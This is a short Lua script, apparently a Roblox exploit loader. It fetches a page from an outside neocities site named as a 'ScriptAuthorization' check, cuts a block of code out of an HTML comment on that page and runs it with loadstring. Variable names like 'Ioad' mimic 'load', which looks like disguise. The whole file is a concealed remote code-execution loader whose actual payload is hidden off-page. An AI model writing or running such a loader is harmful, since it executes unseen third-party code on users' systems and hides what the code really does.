local website = game:HttpGet("https://ghost352.neocities.org/ScriptAuthorization")

if Ioad == nil or IoadClone == nil then
   Ioad = nil
   loadstring(website:sub(website.find(website, "<!--") + 4, website.find(website, "<!--") + 4 + 265))()
   if IoadClone == nil and Ioad ~= nil then
      IoadClone = Ioad
   end
end

if Ioad ~= IoadClone then
   Ioad = IoadClone
end
